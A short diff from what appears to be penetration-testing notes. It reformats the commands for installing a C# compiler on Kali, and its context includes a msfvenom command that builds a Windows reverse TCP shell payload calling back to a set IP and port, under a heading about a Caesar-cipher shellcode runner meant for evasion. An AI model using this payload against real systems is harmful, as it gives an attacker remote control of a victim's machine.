@@ -279,10 +279,10 @@ http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2
 ```
 ### C#
 #### kali install c# compiler
-sudo apt update
-sudo apt install mono-complete
-mcs hello.cs
-mono hello.exe
+sudo apt update  
+sudo apt install mono-complete  
+mcs hello.cs  
+mono hello.exe  
 #### C# Shellcode runner by Caesar Cipher shift by 2
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell  
 encode_cs2.cs
